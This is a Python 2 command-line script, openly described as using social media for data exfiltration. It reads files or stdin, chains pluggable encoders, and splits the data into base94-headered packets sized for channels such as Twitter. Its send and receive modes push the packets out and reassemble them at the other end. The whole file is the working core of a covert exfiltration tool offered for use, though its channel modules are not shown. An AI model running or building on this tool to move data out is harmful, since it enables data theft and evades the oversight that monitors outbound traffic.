#!/usr/bin/python2
import os
import math
import pkgutil
import sys
import importlib
import argparse
import json

import base94

# get all of the possible channels and encoders to load and use

# generate paths to the encoder and channel folders
currentDir = os.path.dirname(os.path.abspath(__file__))
channels = os.path.join(currentDir, 'channels')
encoders = os.path.join(currentDir, 'encoders')

channels = pkgutil.iter_modules(path=[channels])
encoders = pkgutil.iter_modules(path=[encoders])

# these are all of the modules available to be loaded and used
channelOptions = [modName for _,modName,_ in channels]
encodingOptions = [modName for _,modName,_ in encoders]

# command line arguments:
# you can input multiple transfer arguments, so -transfer and encoder will give a
# list of arguments. Need to change use encoder and use channel to loop
parser = argparse.ArgumentParser(description='Use social media as a tool for data exfiltration.')
parser.add_argument('--verbose', '-v', help = 'Output debug and help information.', action='store_true')
subparsers = parser.add_subparsers(dest='subcommand')

# subparser for encoder exploration
parser_encoders = subparsers.add_parser('encoders')
#parser_encoders.add_argument()


#  subparser for channel exploration
parser_channels = subparsers.add_parser('channels')
#parser_channels.add_argument()


# subparser for sending data
parser_send = subparsers.add_parser('send')
parser_send.add_argument('--channel', '-c', dest = 'channelName', metavar="channel_name", action = 'store',
                             help = 'Choose a channel to transfer data over \
                             (e.g, --transfer twitter).', required = True)

parser_send.add_argument('--encoder', '-e', dest = 'encoderNames', metavar="encoder_name", nargs='+', action = 'store',
                             help = 'Choose one or more methods of encoding (done in order given).', required=True)

parser_send.add_argument('--input', '-i', help = 'Specify a file to read from, or leave blank for stdin.',\
                             metavar = 'filename', type = argparse.FileType('r'), default = '-')

parser_send.add_argument('--parameters', '-p', dest = 'params', metavar="parameter_name", type=json.loads, default={},
                             help = "Specify parameters in JSON as shown (including quotations): -p '{\"encoderOrChannel\": {\"key\": \"value\", ...}, ...}'")


# subparser for fetching data
parser_receive = subparsers.add_parser('receive')
parser_receive.add_argument('--channel', '-c', dest = 'channelName', metavar="channel_name", action = 'store',
                             help = 'Choose a channel to transfer data over \
                             (e.g, --transfer twitter).', required = True)

parser_receive.add_argument('--encoder', '-e', dest = 'encoderNames', metavar="encoder_name", nargs='+', action = 'store',
                             help = 'Choose one or more methods of encoding (done in order given).', required=True)

parser_receive.add_argument('--parameters', '-p', dest = 'params', metavar="parameter_name", type=json.loads, default={},
                             help = "Specify parameters in JSON as shown (including quotations): -p '{\"encoderOrChannel\": {\"key\": \"value\", ...}, ...}'")



# subparser for echoing data
parser_echo = subparsers.add_parser('echo')

parser_echo.add_argument('--encoder', '-e', dest = 'encoderNames', metavar="encoder_name", nargs='+', action = 'store',
                             help = 'Choose one or more methods of encoding (done in order given).', required=True)

parser_echo.add_argument('--input', '-i', help = 'Specify a file to read from, or leave blank for stdin.',\
                             metavar = 'filename', type = argparse.FileType('r'), default = '-')

parser_echo.add_argument('--parameters', '-p', dest = 'params', metavar="parameter_name", type=json.loads, default={},
                             help = "Specify parameters in JSON as shown (including quotations): -p '{\"encoderOrChannel\": {\"key\": \"value\", ...}, ...}'")

# parse the args
args = parser.parse_args()
d =  vars(args)

############################################################
################# Output Functions #########################
############################################################

# output functions inspired by  https://bitbucket.org/LaNMaSteR53/recon-ng
class Colors(object):
    N = '\033[m' # native
    R = '\033[31m' # red
    G = '\033[32m' # green
    O = '\033[33m' # orange
    B = '\033[34m' # blue

if args.verbose:
    def output(text, raw=False):
        # formats and outputs regular text
        if raw:
            sys.stdout.write(text)
        else:
            print('{}[*]{} {}'.format(Colors.B, Colors.N, text))

    def progressBar(n, total):
        # repeatedly call as progress happens
        # must start at 0
        sys.stdout.write("\r{} of {}".format(n + 1, total))
        sys.stdout.flush()
        if n == total-1:
            sys.stdout.write('\n')


else:
    # don't output anything
    output = lambda *a, **k: None
    progressBar = output
    # doing it this way means we aren't constantly checking args.verbose

def error(text):
    # formats and outputs errors
    text = text[:1].upper() + text[1:]
    print('{}[!] {}{}'.format(Colors.R, text, Colors.N))

############################################################
############### Send/Receive Functions #####################
############################################################

def receiveData(channelName, params):
    moduleName = '.'.join(['channels', channelName])
    chan = importlib.import_module(moduleName)

    # make sure we have all of the required parameters
    abort = False
    for param,desc in chan.requiredParams['receiving'].iteritems():
        if not param in params:
            error("Missing required parameter \'{}\' for channel \'{}\'.".format(param, channelName))
            abort = True # so that multiple problems can be found in one run
    if(abort):
        sys.exit()

    # receive some stuff
    resp = chan.receive(params)

    # reassemble packets into segments
    segments = []
    buf = []
    # reverse the response so we get oldest first
    for msg in reversed(resp):
        # strip and decode the headers
        tokenized = msg.split(" ")
        packetNo = base94.decode(str(tokenized[0]))
        packetTotal = base94.decode(str(tokenized[1]))
        msg = ''.join(tokenized[2:])

        if len(buf) == 0 and packetNo != 0:
            # we caught the end of a segment, drop this packet
            continue

        # if the packet number isn't equal to the total packets in the segment
        if packetNo+1 != packetTotal:
            # we haven't found the last packet yet, so append this one to the buffer
            buf.append(msg)
        else:
            # the buffer plus what we have here is a full sequence of packets
            buf.append(msg)
            # remove the headers and append all the data
            segment = ''.join(buf)
            segments.append(segment)
            buf = []

    if len(buf) != 0:
        raise AssertionError("buffer is not empty: packet must be missing")

    return segments

def sendData(channelName, data, params):
    # ensure the passed modules are valid
    if not channelName in channelOptions:
        error("Channel " + channelName + " does not exist.")
        return

    # import the channel module
    moduleName = '.'.join(['channels', channelName])
    chan = importlib.import_module(moduleName)

    # make sure we have all of the required parameters
    abort = False
    for param in chan.requiredParams['sending']:
        if not param in params:
            error("Missing required parameter \'{}\' for channel \'{}\'.".format(param, channelName))
            abort = True # so that multiple problems can be found in one run
    if(abort):
        sys.exit()

    # header format: "lll nnn <data>"
    # where "lll" is a 3 character base94 number representing this packet's index
    # "nnn" is a 3 character base94 number representing the total number of packets in the fragment
    # 3 digits in base 94 = max of 830583 packets per fragment
    # this is 109,636,956 characters sent using Twitter,
    # or ~100ish MB assuming each character is one byte
    # pretty sure nobody will ever need more than 640k of ram

    headerLength = 8 # reserve characters for the headers
    actualLength = chan.maxLength - headerLength

    # determine the number of packets we'll need to send
    numPackets = int(math.ceil(len(data) / float(actualLength)))
    maxPackets = base94.decode("~~~")
    if numPackets > maxPackets:
        raise ValueError("you can only send " + maxPackets + " packets at a time")

    if numPackets == 1:
        output("Sending 1 packet.")
    else:
        output("Sending " + str(numPackets) + " packets.")

    for i in range(numPackets):
        # wrap the data in headers
        packet = base94.encode(i) + " " + base94.encode(numPackets) + " " + data[i*actualLength:(i+1)*actualLength]

        # double check that nothing went wrong
        if len(packet) > chan.maxLength:
            raise ValueError(moduleName + " cannot send more than " + chan.maxLength + " characters")

        # if verbose, print a status update
        progressBar(i, numPackets)
        # send some stuff
        chan.send(packet, params)

def encode(encoderName, data, params):
    # encode some data by passing it through the given encoder
    # encoder is ASSUMED GOOD
    moduleName = '.'.join(['encoders', encoderName])
    enc = importlib.import_module(moduleName)
    # This is a programmatic equivalent of:
    # from encoding import exampleEncoder as enc

    # make sure we have all of the required parameters
    abort = False
    for param in enc.requiredParams['encode']:
        if not params or not param in params:
            error("Missing required parameter \'{}\' for encoder \'{}\'.".format(param, encoderName))
            abort = True # so that multiple problems can be found in one run
    if(abort):
        sys.exit()

    data = enc.encode(data, params)

    return data

def decode(encoderName, data, params):
    moduleName = '.'.join(['encoders', encoderName])
    enc = importlib.import_module(moduleName)
    # This is a programmatic equivalent of:
    # from encoding import exampleEncoder as enc

    # make sure we have all of the required parameters
    abort = False
    for param,desc in enc.requiredParams['decode'].iteritems():
        if not params or not param in params:
            error("Missing required parameter \'{}\' for encoder \'{}\'.".format(param, encoderName))
            abort = True # so that multiple problems can be found in one run
    if(abort):
        sys.exit()

    data = enc.decode(data, params)

    return data

def encoders():
    # Do everything to handle the 'encoders' subcommand.
    print("Currently available encoders:")
    print('    ' + ', '.join(encodingOptions))
    return

def channels():
    # Do everything to handle the 'channels' subcommand.
    print("Currently available channels:")
    print('    ' + ', '.join(channelOptions))
    return

############## RUN ##############

args = parser.parse_args()
d = vars(args)

if args.subcommand == 'encoders':
    encoders()

if args.subcommand == 'channels':
    channels()

if args.subcommand == 'send':
    channelName = d.get('channelName')
    encoderNames = d.get('encoderNames')
    params = d.get('params')
    data = d.get('input').read() # either a given file, or stdin

    # check the encoders all exist
    for encoderName in encoderNames:
        if not encoderName in encodingOptions:
            error("Encoder " + encoderName + " does not exist. Exiting.")
            sys.exit()

    # check the channel exists
    if not channelName in channelOptions:
        error("Channel " + channelName + " does not exist. Exiting.")
        sys.exit()

    # tell the user what we're going to do
    output("Pipeline: " + " -> ".join(encoderNames) + " -> " + channelName)

    for encoderName in encoderNames:
        if not encoderName in params:
            params[encoderName] = {}

    if not channelName in params:
        params[channelName] = {}

    encoded = data
    for encoderName in encoderNames:
        encoded = encode(encoderName, encoded, params[encoderName])

    sendData(channelName, encoded, params[channelName])

if args.subcommand == 'receive':
    channelName = d.get('channelName')
    encoderNames = d.get('encoderNames')
    params = d.get('params')
    if params is None: params = {}

    # check the encoders all exist
    for encoderName in encoderNames:
        if not encoderName in encodingOptions:
            error("Encoder " + encoderName + " does not exist. Exiting.")
            sys.exit()

    # check the channel exists
    if not channelName in channelOptions:
        error("Channel " + channelName + " does not exist. Exiting.")
        sys.exit()

    if not channelName in params:
        params[channelName] = {}
    data = receiveData(channelName, params[channelName])

    if not isinstance(data, list):
        raise TypeError('Data must be returned from channel receive method as an array.')
        # the array is of individual 'packets' - i.e. metadata-wrapped bits of data
        # this allows for timestamping messages, sending large messages as multiple
        # fragments, etc.

    # if params aren't specified, set it blank so we don't get KeyErrors thrown
    for encoderName in encoderNames:
        if not encoderName in params:
            params[encoderName] = {}

    output = []
    # data is an array of individual messages - decode them all one at a time
    for datum in data:
        for encoderName in reversed(encoderNames):
            # go through the encoder chain in reverse to decode the data
            # This allows decoders to be specified in the same order on both ends, and still work.
            datum = decode(encoderName, datum, params[encoderName])
        # remove trailing newlines and spaces - they're added by some channels
        output.append(datum.rstrip())

    # write out the results
    sys.stdout.write(", ".join(output))

if args.subcommand == 'echo':
    encoderNames = d.get('encoderNames')
    params = d.get('params')
    data = d.get('input').read()  # either a given file, or stdin

    for encoderName in encoderNames:
        # Check that all encoders exist
        if encoderName not in encodingOptions:
            error("encoder " + encoderName + " does not exist. Exiting.")
            sys.exit()

        if encoderName not in params:
            params[encoderName] = {}

    encoded = data
    for encoderName in encoderNames:
        encoded = encode(encoderName, encoded, params[encoderName])

    output("Encoded: " + encoded)

    decoded = encoded
    for encoderName in reversed(encoderNames):
        decoded = decode(encoderName, decoded, params[encoderName])

    output("Decoded: " + decoded)
